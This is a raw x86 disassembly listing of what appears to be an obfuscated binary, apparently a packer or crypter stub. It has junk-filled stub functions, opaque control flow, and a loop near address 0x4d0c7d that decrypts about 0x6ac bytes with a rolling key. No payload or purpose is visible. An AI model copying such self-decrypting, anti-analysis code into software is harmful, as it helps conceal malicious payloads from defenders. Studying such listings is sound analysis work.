  4d0799:	push   edx
  4d079a:	call   0x4d0f58
  4d079f:	add    esp,0xc
  4d07a2:	pop    edi
  4d07a3:	push   edi
  4d07a4:	mov    ebx,0x0
  4d07a9:	push   ebx
  4d07aa:	call   0x4d08c8
  4d07af:	add    esp,0x4
  4d07b2:	pop    edi
  4d07b3:	add    esp,0x44
  4d07b6:	pop    ebp
  4d07b7:	ret    
  4d07b8:	mov    edi,edi
  4d07ba:	push   ebp
  4d07bb:	mov    ebp,esp
  4d07bd:	sub    esp,0x24
  4d07c0:	mov    ebx,0x4d310c
  4d07c5:	cmp    ebx,0x75ab
  4d07cb:	je     0x4d07bb
  4d07cd:	push   ebx
  4d07ce:	push   DWORD PTR [ebx+0x1e4]
  4d07d4:	push   edx
  4d07d5:	push   edx
  4d07d6:	call   0x4d0d78
  4d07db:	add    esp,0xc
  4d07de:	pop    ebx
  4d07df:	push   0x0
  4d07e1:	call   0x4d0d24
  4d07e6:	add    esp,0x4
  4d07e9:	mov    edx,0x0
  4d07ee:	push   edx
  4d07ef:	call   0x4d0960
  4d07f4:	add    esp,0x4
  4d07f7:	add    esp,0x24
  4d07fa:	pop    ebp
  4d07fb:	ret    
  4d07fc:	mov    edi,edi
  4d07fe:	push   ebp
  4d07ff:	mov    ebp,esp
  4d0801:	sub    esp,0x60
  4d0804:	mov    edx,0x4d30a4
  4d0809:	cmp    edx,0x585f
  4d080f:	jbe    0x4d07ff
  4d0811:	push   edx
  4d0812:	push   DWORD PTR [edx+0x1e4]
  4d0818:	push   esi
  4d0819:	call   0x4d07b8
  4d081e:	add    esp,0x8
  4d0821:	pop    edx
  4d0822:	push   edx
  4d0823:	lea    eax,[edx-0xa4]
  4d0829:	push   eax
  4d082a:	call   0x4d0fe4
  4d082f:	add    esp,0x4
  4d0832:	test   eax,eax
  4d0834:	jne    0x4d0823
  4d0836:	pop    edx
  4d0837:	mov    edi,0x4d2008
  4d083c:	mov    edi,DWORD PTR [edi]
  4d083e:	push   edi
  4d083f:	push   DWORD PTR [edx+0x5c]
  4d0842:	pop    eax
  4d0843:	call   eax
  4d0845:	add    esp,0x60
  4d0848:	pop    ebp
  4d0849:	ret    
  4d084a:	add    BYTE PTR [eax],al
  4d084c:	pop    edi
  4d084d:	call   DWORD PTR ds:0x4d2000
  4d0853:	call   edi
  4d0855:	add    BYTE PTR [eax],al
  4d0857:	add    BYTE PTR [edi-0x1],bl
  4d085a:	adc    eax,0x4d205c
  4d085f:	call   edi
  4d0861:	add    BYTE PTR [eax],al
  4d0863:	add    BYTE PTR [edi-0x1],bl
  4d0866:	adc    eax,0x4d2090
  4d086b:	call   edi
  4d086d:	add    BYTE PTR [eax],al
  4d086f:	add    BYTE PTR [edi-0x1],bl
  4d0872:	adc    eax,0x4d2058
  4d0877:	call   edi
  4d0879:	add    BYTE PTR [eax],al
  4d087b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0881:	sub    esp,0x50
  4d0884:	lea    edi,ds:0x4d3084
  4d088a:	xor    esi,DWORD PTR [ebp-0xc]
  4d088d:	push   edi
  4d088e:	push   DWORD PTR [edi+0x1dc]
  4d0894:	push   ebx
  4d0895:	push   DWORD PTR [edi+0x120]
  4d089b:	push   esi
  4d089c:	call   0x4d14d4
  4d08a1:	add    esp,0x10
  4d08a4:	pop    edi
  4d08a5:	push   edi
  4d08a6:	mov    eax,0x0
  4d08ab:	push   eax
  4d08ac:	call   0x4d12f8
  4d08b1:	add    esp,0x4
  4d08b4:	pop    edi
  4d08b5:	push   edi
  4d08b6:	push   0x0
  4d08b8:	call   0x4d0e18
  4d08bd:	add    esp,0x4
  4d08c0:	pop    edi
  4d08c1:	add    esp,0x50
  4d08c4:	pop    ebp
  4d08c5:	ret    
  4d08c6:	add    BYTE PTR [eax],al
  4d08c8:	pop    edi
  4d08c9:	call   DWORD PTR ds:0x4d2030
  4d08cf:	call   edi
  4d08d1:	add    BYTE PTR [eax],al
  4d08d3:	add    BYTE PTR [edi-0x1],bl
  4d08d6:	adc    eax,0x4d2018
  4d08db:	call   edi
  4d08dd:	add    BYTE PTR [eax],al
  4d08df:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d08e5:	sub    esp,0x2c
  4d08e8:	lea    ecx,ds:0x4d303c
  4d08ee:	and    ebx,DWORD PTR [ebp-0x14]
  4d08f1:	push   ecx
  4d08f2:	push   DWORD PTR [ecx+0x190]
  4d08f8:	push   esi
  4d08f9:	call   0x4d1078
  4d08fe:	add    esp,0x8
  4d0901:	pop    ecx
  4d0902:	push   ecx
  4d0903:	push   0x0
  4d0905:	call   0x4d0858
  4d090a:	add    esp,0x4
  4d090d:	pop    ecx
  4d090e:	push   ecx
  4d090f:	push   0x0
  4d0911:	call   0x4d08c8
  4d0916:	add    esp,0x4
  4d0919:	pop    ecx
  4d091a:	add    esp,0x2c
  4d091d:	pop    ebp
  4d091e:	ret    
  4d091f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0925:	sub    esp,0x48
  4d0928:	lea    esi,ds:0x4d30ec
  4d092e:	or     edx,DWORD PTR [esi+0xe8]
  4d0934:	mov    edi,0x0
  4d0939:	push   edi
  4d093a:	call   0x4d0960
  4d093f:	add    esp,0x4
  4d0942:	push   esi
  4d0943:	push   ecx
  4d0944:	push   DWORD PTR [esi+0x38]
  4d0947:	call   0x4d1568
  4d094c:	add    esp,0x8
  4d094f:	pop    esi
  4d0950:	call   0x4d084c
  4d0955:	add    esp,0x4
  4d0958:	add    esp,0x48
  4d095b:	pop    ebp
  4d095c:	ret    
  4d095d:	add    BYTE PTR [eax],al
  4d095f:	add    BYTE PTR [edi-0x1],bl
  4d0962:	adc    eax,0x4d206c
  4d0967:	call   edi
  4d0969:	add    BYTE PTR [eax],al
  4d096b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0971:	sub    esp,0x48
  4d0974:	lea    ecx,[edi-0x94]
  4d097a:	sub    DWORD PTR [ecx+0x12c],0xfffffff8
  4d0981:	push   ecx
  4d0982:	push   edi
  4d0983:	push   DWORD PTR [ecx+0x28]
  4d0986:	call   0x4d128c
  4d098b:	add    esp,0x8
  4d098e:	pop    ecx
  4d098f:	push   ecx
  4d0990:	push   0x0
  4d0992:	call   0x4d0d24
  4d0997:	add    esp,0x4
  4d099a:	pop    ecx
  4d099b:	push   ecx
  4d099c:	mov    edi,0x0
  4d09a1:	push   edi
  4d09a2:	call   0x4d0a90
  4d09a7:	add    esp,0x4
  4d09aa:	pop    ecx
  4d09ab:	add    esp,0x48
  4d09ae:	pop    ebp
  4d09af:	ret    
  4d09b0:	mov    edi,edi
  4d09b2:	push   ebp
  4d09b3:	mov    ebp,esp
  4d09b5:	sub    esp,0x2c
  4d09b8:	lea    edi,[eax-0x18c]
  4d09be:	xor    DWORD PTR [edi+0x13c],0xfffffffb
  4d09c5:	push   edi
  4d09c6:	push   0x0
  4d09c8:	call   0x4d0a90
  4d09cd:	add    esp,0x4
  4d09d0:	pop    edi
  4d09d1:	push   edi
  4d09d2:	push   DWORD PTR [edi+0xf4]
  4d09d8:	push   DWORD PTR [edi+0xac]
  4d09de:	push   DWORD PTR [edi+0x30]
  4d09e1:	push   DWORD PTR [edi+0x150]
  4d09e7:	call   0x4d141c
  4d09ec:	add    esp,0x10
  4d09ef:	pop    edi
  4d09f0:	push   edi
  4d09f1:	mov    eax,0x0
  4d09f6:	push   eax
  4d09f7:	call   0x4d0a90
  4d09fc:	add    esp,0x4
  4d09ff:	pop    edi
  4d0a00:	add    esp,0x2c
  4d0a03:	pop    ebp
  4d0a04:	ret    
  4d0a05:	add    BYTE PTR [eax],al
  4d0a07:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0a0d:	sub    esp,0x1c
  4d0a10:	lea    esi,ds:0x4d3134
  4d0a16:	sub    ecx,DWORD PTR [esi-0xec]
  4d0a1c:	push   esi
  4d0a1d:	push   ebx
  4d0a1e:	push   edx
  4d0a1f:	push   DWORD PTR [esi+0xe8]
  4d0a25:	push   DWORD PTR [esi+0x80]
  4d0a2b:	call   0x4d0ae4
  4d0a30:	add    esp,0x10
  4d0a33:	pop    esi
  4d0a34:	push   0x0
  4d0a36:	call   0x4d0f4c
  4d0a3b:	add    esp,0x4
  4d0a3e:	push   0x0
  4d0a40:	call   0x4d12f8
  4d0a45:	add    esp,0x4
  4d0a48:	add    esp,0x1c
  4d0a4b:	pop    ebp
  4d0a4c:	ret    
  4d0a4d:	add    BYTE PTR [eax],al
  4d0a4f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0a55:	sub    esp,0x58
  4d0a58:	mov    edx,0x4d3174
  4d0a5d:	or     ecx,DWORD PTR [ebp-0x34]
  4d0a60:	push   edx
  4d0a61:	push   eax
  4d0a62:	push   eax
  4d0a63:	push   DWORD PTR [edx+0x40]
  4d0a66:	push   DWORD PTR [edx+0x1a4]
  4d0a6c:	call   0x4d1380
  4d0a71:	add    esp,0x10
  4d0a74:	pop    edx
  4d0a75:	push   edx
  4d0a76:	push   0x0
  4d0a78:	call   0x4d0858
  4d0a7d:	add    esp,0x4
  4d0a80:	pop    edx
  4d0a81:	push   edx
  4d0a82:	call   0x4d0d18
  4d0a87:	add    esp,0x4
  4d0a8a:	pop    edx
  4d0a8b:	add    esp,0x58
  4d0a8e:	pop    ebp
  4d0a8f:	ret    
  4d0a90:	pop    edi
  4d0a91:	call   DWORD PTR ds:0x4d2034
  4d0a97:	call   edi
  4d0a99:	add    BYTE PTR [eax],al
  4d0a9b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0aa1:	sub    esp,0x20
  4d0aa4:	lea    ebx,ds:0x4d3034
  4d0aaa:	xor    DWORD PTR [ebx+0x70],edx
  4d0aad:	call   0x4d0d18
  4d0ab2:	add    esp,0x4
  4d0ab5:	push   ebx
  4d0ab6:	push   DWORD PTR [ebx+0x94]
  4d0abc:	push   DWORD PTR [ebx+0x1c8]
  4d0ac2:	push   DWORD PTR [ebx+0x158]
  4d0ac8:	push   eax
  4d0ac9:	call   0x4d0730
  4d0ace:	add    esp,0x10
  4d0ad1:	pop    ebx
  4d0ad2:	push   0x0
  4d0ad4:	call   0x4d12ec
  4d0ad9:	add    esp,0x4
  4d0adc:	add    esp,0x20
  4d0adf:	pop    ebp
  4d0ae0:	ret    
  4d0ae1:	add    BYTE PTR [eax],al
  4d0ae3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0ae9:	sub    esp,0x3c
  4d0aec:	lea    edx,ds:0x4d3168
  4d0af2:	adc    eax,DWORD PTR [ebp-0x14]
  4d0af5:	push   edx
  4d0af6:	call   0x4d084c
  4d0afb:	add    esp,0x4
  4d0afe:	pop    edx
  4d0aff:	push   edx
  4d0b00:	push   ecx
  4d0b01:	push   DWORD PTR [edx+0xd0]
  4d0b07:	call   0x4d0efc
  4d0b0c:	add    esp,0x8
  4d0b0f:	pop    edx
  4d0b10:	push   edx
  4d0b11:	call   0x4d084c
  4d0b16:	add    esp,0x4
  4d0b19:	pop    edx
  4d0b1a:	add    esp,0x3c
  4d0b1d:	pop    ebp
  4d0b1e:	ret    
  4d0b1f:	add    BYTE PTR [edi-0x1],bl
  4d0b22:	adc    eax,0x4d2060
  4d0b27:	call   edi
  4d0b29:	add    BYTE PTR [eax],al
  4d0b2b:	add    BYTE PTR [edi-0x1],bl
  4d0b2e:	adc    eax,0x4d2028
  4d0b33:	call   edi
  4d0b35:	add    BYTE PTR [eax],al
  4d0b37:	add    BYTE PTR [edi-0x1],bl
  4d0b3a:	adc    eax,0x4d2010
  4d0b3f:	call   edi
  4d0b41:	add    BYTE PTR [eax],al
  4d0b43:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0b49:	sub    esp,0x5c
  4d0b4c:	mov    ecx,0x4d3040
  4d0b51:	mov    eax,DWORD PTR [ebp-0x28]
  4d0b54:	push   ecx
  4d0b55:	push   edx
  4d0b56:	push   DWORD PTR [ecx+0x24]
  4d0b59:	push   DWORD PTR [ecx+0x160]
  4d0b5f:	call   0x4d0e78
  4d0b64:	add    esp,0xc
  4d0b67:	pop    ecx
  4d0b68:	push   ecx
  4d0b69:	call   0x4d0d18
  4d0b6e:	add    esp,0x4
  4d0b71:	pop    ecx
  4d0b72:	push   ecx
  4d0b73:	mov    ebx,0x0
  4d0b78:	push   ebx
  4d0b79:	call   0x4d14bc
  4d0b7e:	add    esp,0x4
  4d0b81:	pop    ecx
  4d0b82:	add    esp,0x5c
  4d0b85:	pop    ebp
  4d0b86:	ret    
  4d0b87:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0b8d:	sub    esp,0x2c
  4d0b90:	lea    esi,ds:0x4d3100
  4d0b96:	xor    eax,DWORD PTR [esi+0x48]
  4d0b99:	push   esi
  4d0b9a:	push   DWORD PTR [esi+0x170]
  4d0ba0:	push   ebx
  4d0ba1:	push   DWORD PTR [esi+0x1dc]
  4d0ba7:	call   0x4d0a9c
  4d0bac:	add    esp,0xc
  4d0baf:	pop    esi
  4d0bb0:	push   0xfffffff4
  4d0bb2:	call   0x4d0b2c
  4d0bb7:	add    esp,0x4
  4d0bba:	push   0x0
  4d0bbc:	call   0x4d08c8
  4d0bc1:	add    esp,0x4
  4d0bc4:	add    esp,0x2c
  4d0bc7:	pop    ebp
  4d0bc8:	ret    
  4d0bc9:	add    BYTE PTR [eax],al
  4d0bcb:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0bd1:	sub    esp,0x48
  4d0bd4:	lea    ecx,[ebx-0x18]
  4d0bd7:	adc    DWORD PTR [ebp-0x18],edx
  4d0bda:	push   ecx
  4d0bdb:	mov    edi,0x0
  4d0be0:	push   edi
  4d0be1:	call   0x4d0a90
  4d0be6:	add    esp,0x4
  4d0be9:	pop    ecx
  4d0bea:	push   ecx
  4d0beb:	push   edi
  4d0bec:	push   DWORD PTR [ecx+0x188]
  4d0bf2:	push   DWORD PTR [ecx+0x19c]
  4d0bf8:	push   esi
  4d0bf9:	call   0x4d0a50
  4d0bfe:	add    esp,0x10
  4d0c01:	pop    ecx
  4d0c02:	push   ecx
  4d0c03:	push   0x0
  4d0c05:	call   0x4d12ec
  4d0c0a:	add    esp,0x4
  4d0c0d:	pop    ecx
  4d0c0e:	add    esp,0x48
  4d0c11:	pop    ebp
  4d0c12:	ret    
  4d0c13:	add    BYTE PTR [edi-0x1],bl
  4d0c16:	adc    eax,0x4d207c
  4d0c1b:	call   edi
  4d0c1d:	add    BYTE PTR [eax],al
  4d0c1f:	add    BYTE PTR [edi+0x2b],dl
  4d0c22:	call   DWORD PTR [edi+0x57]
  4d0c25:	push   edi
  4d0c26:	push   edi
  4d0c27:	call   0x4d0c6c
  4d0c2c:	sub    esp,0xfffffffc
  4d0c2f:	call   0x4d0b38
  4d0c34:	push   0x2
  4d0c36:	xor    eax,eax
  4d0c38:	adc    eax,0x4d3030
  4d0c3d:	push   0x0
  4d0c3f:	xor    ecx,ecx
  4d0c41:	adc    ecx,0x4d3036
  4d0c47:	add    BYTE PTR [ecx],0x41
  4d0c4a:	push   eax
  4d0c4b:	call   0x4d1304
  4d0c50:	pop    edi
  4d0c51:	pop    edi
  4d0c52:	pop    edi
  4d0c53:	lea    edi,[eax+0x3b]
  4d0c56:	mov    edi,DWORD PTR [edi]
  4d0c58:	lea    eax,[eax+edi*1]
  4d0c5b:	mov    eax,DWORD PTR [eax+0x28]
  4d0c5e:	pusha  
  4d0c5f:	mov    ah,0x45
  4d0c61:	sub    al,ah
  4d0c63:	ja     0x4d07fc
  4d0c69:	popa   
  4d0c6a:	ret    
  4d0c6b:	add    BYTE PTR [edi-0x1],bl
  4d0c6e:	adc    eax,0x4d2020
  4d0c73:	call   edi
  4d0c75:	add    BYTE PTR [eax],al
  4d0c77:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0c7d:	sub    esp,0x24
  4d0c80:	add    DWORD PTR [edx+0xf0],edx
  4d0c86:	lea    edi,ds:0x4d318c
  4d0c8c:	push   edi
  4d0c8d:	mov    ecx,0x6ac
  4d0c92:	push   ecx
  4d0c93:	mov    eax,0x6ac
  4d0c98:	push   eax
  4d0c99:	mov    edi,0x40001
  4d0c9e:	push   edi
  4d0c9f:	mov    ecx,0x862985b2
  4d0ca4:	push   DWORD PTR [ecx+0x7a239a86]
  4d0caa:	sub    DWORD PTR [esp],0x2
  4d0cae:	mov    ecx,0x4d2040
  4d0cb3:	pop    DWORD PTR [ecx]
  4d0cb5:	call   0x4d1304
  4d0cba:	add    esp,0x4
  4d0cbd:	xchg   DWORD PTR [esp],eax
  4d0cc0:	mov    edi,eax
  4d0cc2:	pop    DWORD PTR [edi-0x8c]
  4d0cc8:	mov    ecx,DWORD PTR [edi-0x8c]
  4d0cce:	mov    eax,ecx
  4d0cd0:	sub    ecx,ecx
  4d0cd2:	dec    ecx
  4d0cd3:	and    ecx,0x4d0014
  4d0cd9:	mov    ebx,0xd5d9a824
  4d0cde:	xor    edx,edx
  4d0ce0:	cmp    edx,0x6ac
  4d0ce6:	je     0x4d0d04
  4d0ce8:	sub    edx,0xfffffffc
  4d0ceb:	xor    esi,esi
  4d0ced:	push   DWORD PTR [ecx+esi*1]
  4d0cf0:	add    DWORD PTR [esp],ebx
  4d0cf3:	pop    DWORD PTR [eax+esi*2]
  4d0cf6:	dec    DWORD PTR [eax]
  4d0cf8:	xor    ebx,ebx
  4d0cfa:	add    ebx,DWORD PTR [ecx]
  4d0cfc:	add    ecx,0x4
  4d0cff:	add    eax,0x4
  4d0d02:	jmp    0x4d0ce0
  4d0d04:	push   edi
  4d0d05:	push   0x0
  4d0d07:	call   0x4d08c8
  4d0d0c:	add    esp,0x4
  4d0d0f:	pop    edi
  4d0d10:	add    esp,0x24
  4d0d13:	pop    ebp
  4d0d14:	ret    
  4d0d15:	add    BYTE PTR [eax],al
  4d0d17:	add    BYTE PTR [edi-0x1],bl
  4d0d1a:	adc    eax,0x4d2024
  4d0d1f:	call   edi
  4d0d21:	add    BYTE PTR [eax],al
  4d0d23:	add    BYTE PTR [edi-0x1],bl
  4d0d26:	adc    eax,0x4d202c
  4d0d2b:	call   edi
  4d0d2d:	add    BYTE PTR [eax],al
  4d0d2f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0d35:	sub    esp,0x40
  4d0d38:	lea    eax,ds:0x4d3008
  4d0d3e:	sub    esi,ebx
  4d0d40:	push   eax
  4d0d41:	push   DWORD PTR [eax+0x54]
  4d0d44:	push   DWORD PTR [eax+0x190]
  4d0d4a:	push   edx
  4d0d4b:	push   edi
  4d0d4c:	call   0x4d0ff0
  4d0d51:	add    esp,0x10
  4d0d54:	pop    eax
  4d0d55:	push   eax
  4d0d56:	mov    ebx,0x0
  4d0d5b:	push   ebx
  4d0d5c:	call   0x4d0f4c
  4d0d61:	add    esp,0x4
  4d0d64:	pop    eax
  4d0d65:	push   eax
  4d0d66:	push   0x0
  4d0d68:	call   0x4d0d24
  4d0d6d:	add    esp,0x4
  4d0d70:	pop    eax
  4d0d71:	add    esp,0x40
  4d0d74:	pop    ebp
  4d0d75:	ret    
  4d0d76:	add    BYTE PTR [eax],al
  4d0d78:	mov    edi,edi
  4d0d7a:	push   ebp
  4d0d7b:	mov    ebp,esp
  4d0d7d:	sub    esp,0x28
  4d0d80:	mov    edx,0x4d3084
  4d0d85:	cmp    edx,0x707b
  4d0d8b:	jbe    0x4d0d7b
  4d0d8d:	push   edx
  4d0d8e:	mov    ebx,0x0
  4d0d93:	push   ebx
  4d0d94:	call   0x4d08c8
  4d0d99:	add    esp,0x4
  4d0d9c:	pop    edx
  4d0d9d:	push   edx
  4d0d9e:	push   DWORD PTR [edx+0x84]
  4d0da4:	push   DWORD PTR [edx+0xd4]
  4d0daa:	push   DWORD PTR [edx+0x7c]
  4d0dad:	call   0x4d087c
  4d0db2:	add    esp,0xc
  4d0db5:	pop    edx
  4d0db6:	push   edx
  4d0db7:	push   0x0
  4d0db9:	call   0x4d12f8
  4d0dbe:	add    esp,0x4
  4d0dc1:	pop    edx
  4d0dc2:	add    esp,0x28
  4d0dc5:	pop    ebp
  4d0dc6:	ret    
  4d0dc7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0dcd:	sub    esp,0x40
  4d0dd0:	lea    esi,ds:0x4d305c
  4d0dd6:	adc    eax,DWORD PTR [esi+0x184]
  4d0ddc:	push   0xfffffff4
  4d0dde:	call   0x4d0b2c
  4d0de3:	add    esp,0x4
  4d0de6:	push   esi
  4d0de7:	push   DWORD PTR [esi+0xdc]
  4d0ded:	push   DWORD PTR [esi+0xe8]
  4d0df3:	push   eax
  4d0df4:	push   DWORD PTR [esi+0xc0]
  4d0dfa:	call   0x4d115c
  4d0dff:	add    esp,0x10
  4d0e02:	pop    esi
  4d0e03:	mov    edi,0x0
  4d0e08:	push   edi
  4d0e09:	call   0x4d0960
  4d0e0e:	add    esp,0x4
  4d0e11:	add    esp,0x40
  4d0e14:	pop    ebp
  4d0e15:	ret    
  4d0e16:	add    BYTE PTR [eax],al
  4d0e18:	pop    edi
  4d0e19:	call   DWORD PTR ds:0x4d201c
  4d0e1f:	call   edi
  4d0e21:	add    BYTE PTR [eax],al
  4d0e23:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0e29:	sub    esp,0x5c
  4d0e2c:	mov    edi,0x4d30ec
  4d0e31:	add    eax,0x42a2
  4d0e36:	push   edi
  4d0e37:	push   eax
  4d0e38:	push   DWORD PTR [edi+0x10]
  4d0e3b:	push   DWORD PTR [edi+0x1ac]
  4d0e41:	call   0x4d123c
  4d0e46:	add    esp,0xc
  4d0e49:	pop    edi
  4d0e4a:	push   edi
  4d0e4b:	push   0x0
  4d0e4d:	call   0x4d14bc
  4d0e52:	add    esp,0x4
  4d0e55:	pop    edi
  4d0e56:	push   edi
  4d0e57:	mov    eax,0xfffffff4
  4d0e5c:	push   eax
  4d0e5d:	call   0x4d0b2c
  4d0e62:	add    esp,0x4
  4d0e65:	pop    edi
  4d0e66:	add    esp,0x5c
  4d0e69:	pop    ebp
  4d0e6a:	ret    
  4d0e6b:	add    BYTE PTR [edi-0x1],bl
  4d0e6e:	adc    eax,0x4d2068
  4d0e73:	call   edi
  4d0e75:	add    BYTE PTR [eax],al
  4d0e77:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0e7d:	sub    esp,0x44
  4d0e80:	lea    eax,ds:0x4d31fc
  4d0e86:	mov    edi,0xffffffa4
  4d0e8b:	push   eax
  4d0e8c:	call   0x4d084c
  4d0e91:	add    esp,0x4
  4d0e94:	pop    eax
  4d0e95:	push   eax
  4d0e96:	push   esi
  4d0e97:	push   DWORD PTR [eax+0x1a0]
  4d0e9d:	call   0x4d06ec
  4d0ea2:	add    esp,0x8
  4d0ea5:	pop    eax
  4d0ea6:	push   eax
  4d0ea7:	lea    ebx,[eax-0x1fc]
  4d0ead:	push   ebx
  4d0eae:	call   0x4d0fe4
  4d0eb3:	add    esp,0x4
  4d0eb6:	test   eax,eax
  4d0eb8:	jne    0x4d0ea7
  4d0eba:	pop    eax
  4d0ebb:	add    esp,0x44
  4d0ebe:	pop    ebp
  4d0ebf:	ret    
  4d0ec0:	mov    edi,edi
  4d0ec2:	push   ebp
  4d0ec3:	mov    ebp,esp
  4d0ec5:	sub    esp,0x20
  4d0ec8:	mov    esi,0x4d31d8
  4d0ecd:	mov    edi,DWORD PTR [ebp-0x4]
  4d0ed0:	push   esi
  4d0ed1:	push   ecx
  4d0ed2:	push   DWORD PTR [esi+0x170]
  4d0ed8:	push   ebx
  4d0ed9:	call   0x4d13e8
  4d0ede:	add    esp,0xc
  4d0ee1:	pop    esi
  4d0ee2:	push   0x0
  4d0ee4:	call   0x4d0960
  4d0ee9:	add    esp,0x4
  4d0eec:	call   0x4d0d18
  4d0ef1:	add    esp,0x4
  4d0ef4:	add    esp,0x20
  4d0ef7:	pop    ebp
  4d0ef8:	ret    
  4d0ef9:	add    BYTE PTR [eax],al
  4d0efb:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0f01:	sub    esp,0x5c
  4d0f04:	lea    edi,[edx-0x13c]
  4d0f0a:	add    DWORD PTR [ebp-0x5c],esi
  4d0f0d:	push   edi
  4d0f0e:	push   DWORD PTR [edi+0x94]
  4d0f14:	push   edx
  4d0f15:	push   edx
  4d0f16:	call   0x4d1474
  4d0f1b:	add    esp,0xc
  4d0f1e:	pop    edi
  4d0f1f:	push   edi
  4d0f20:	push   0x0
  4d0f22:	call   0x4d0a90
  4d0f27:	add    esp,0x4
  4d0f2a:	pop    edi
  4d0f2b:	push   edi
  4d0f2c:	mov    ebx,0x0
  4d0f31:	push   ebx
  4d0f32:	call   0x4d0960
  4d0f37:	add    esp,0x4
  4d0f3a:	pop    edi
  4d0f3b:	add    esp,0x5c
  4d0f3e:	pop    ebp
  4d0f3f:	ret    
  4d0f40:	pop    edi
  4d0f41:	call   DWORD PTR ds:0x4d2088
  4d0f47:	call   edi
  4d0f49:	add    BYTE PTR [eax],al
  4d0f4b:	add    BYTE PTR [edi-0x1],bl
  4d0f4e:	adc    eax,0x4d2004
  4d0f53:	call   edi
  4d0f55:	add    BYTE PTR [eax],al
  4d0f57:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0f5d:	sub    esp,0x48
  4d0f60:	lea    ecx,ds:0x4d3108
  4d0f66:	sbb    edx,edi
  4d0f68:	push   ecx
  4d0f69:	push   DWORD PTR [ecx+0x1fc]
  4d0f6f:	push   DWORD PTR [ecx+0x118]
  4d0f75:	call   0x4d0e24
  4d0f7a:	add    esp,0x8
  4d0f7d:	pop    ecx
  4d0f7e:	push   ecx
  4d0f7f:	mov    esi,0x0
  4d0f84:	push   esi
  4d0f85:	call   0x4d08c8
  4d0f8a:	add    esp,0x4
  4d0f8d:	pop    ecx
  4d0f8e:	push   ecx
  4d0f8f:	push   0x0
  4d0f91:	call   0x4d0e18
  4d0f96:	add    esp,0x4
  4d0f99:	pop    ecx
  4d0f9a:	add    esp,0x48
  4d0f9d:	pop    ebp
  4d0f9e:	ret    
  4d0f9f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0fa5:	sub    esp,0x48
  4d0fa8:	lea    edx,ds:0x4d3014
  4d0fae:	or     DWORD PTR [edx+0x34],eax
  4d0fb1:	push   edx
  4d0fb2:	call   0x4d084c
  4d0fb7:	add    esp,0x4
  4d0fba:	pop    edx
  4d0fbb:	push   edx
  4d0fbc:	push   DWORD PTR [edx+0x1c8]
  4d0fc2:	push   ebx
  4d0fc3:	push   DWORD PTR [edx+0xf0]
  4d0fc9:	push   esi
  4d0fca:	call   0x4d0920
  4d0fcf:	add    esp,0x10
  4d0fd2:	pop    edx
  4d0fd3:	push   edx
  4d0fd4:	push   0xfffffff4
  4d0fd6:	call   0x4d0b2c
  4d0fdb:	add    esp,0x4
  4d0fde:	pop    edx
  4d0fdf:	add    esp,0x48
  4d0fe2:	pop    ebp
  4d0fe3:	ret    
  4d0fe4:	pop    edi
  4d0fe5:	call   DWORD PTR ds:0x4d2008
  4d0feb:	call   edi
  4d0fed:	add    BYTE PTR [eax],al
  4d0fef:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0ff5:	sub    esp,0x40
  4d0ff8:	lea    edx,ds:0x4d305c
  4d0ffe:	add    DWORD PTR [edx+0xfc],eax
  4d1004:	push   edx
  4d1005:	push   ebx
  4d1006:	push   DWORD PTR [edx+0x6c]
  4d1009:	push   esi
  4d100a:	push   eax
  4d100b:	call   0x4d0ec0
  4d1010:	add    esp,0x10
  4d1013:	pop    edx
  4d1014:	push   edx
  4d1015:	mov    esi,0x0
  4d101a:	push   esi
  4d101b:	call   0x4d0960
  4d1020:	add    esp,0x4
  4d1023:	pop    edx
  4d1024:	push   edx
  4d1025:	push   0x0
  4d1027:	call   0x4d0960
  4d102c:	add    esp,0x4
  4d102f:	pop    edx
  4d1030:	add    esp,0x40
  4d1033:	pop    ebp
  4d1034:	ret    
  4d1035:	add    BYTE PTR [eax],al
  4d1037:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d103d:	sub    esp,0x50
  4d1040:	lea    edi,[ebx+0x14]
  4d1043:	add    ecx,edx
  4d1045:	push   edi
  4d1046:	push   DWORD PTR [edi+0xe4]
  4d104c:	push   eax
  4d104d:	push   DWORD PTR [edi+0xe0]
  4d1053:	call   0x4d1328
  4d1058:	add    esp,0xc
  4d105b:	pop    edi
  4d105c:	push   edi
  4d105d:	push   0x0
  4d105f:	call   0x4d12ec
  4d1064:	add    esp,0x4
  4d1067:	pop    edi
  4d1068:	push   edi
  4d1069:	call   0x4d084c
  4d106e:	add    esp,0x4
  4d1071:	pop    edi
  4d1072:	add    esp,0x50
  4d1075:	pop    ebp
  4d1076:	ret    
  4d1077:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d107d:	sub    esp,0x4c
  4d1080:	lea    eax,ds:0x4d31a8
  4d1086:	mov    DWORD PTR [ebp-0x48],ecx
  4d1089:	push   eax
  4d108a:	push   0x0
  4d108c:	call   0x4d0960
  4d1091:	add    esp,0x4
  4d1094:	pop    eax
  4d1095:	push   eax
  4d1096:	push   edi
  4d1097:	push   DWORD PTR [eax+0x1f8]
  4d109d:	call   0x4d09b0
  4d10a2:	add    esp,0x8
  4d10a5:	pop    eax
  4d10a6:	push   eax
  4d10a7:	push   0x0
  4d10a9:	call   0x4d0858
  4d10ae:	add    esp,0x4
  4d10b1:	pop    eax
  4d10b2:	add    esp,0x4c
  4d10b5:	pop    ebp
  4d10b6:	ret    
  4d10b7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d10bd:	sub    esp,0x30
  4d10c0:	mov    ecx,0x4d316c
  4d10c5:	xor    DWORD PTR [ecx-0x144],0xffffbd16
  4d10cf:	push   ecx
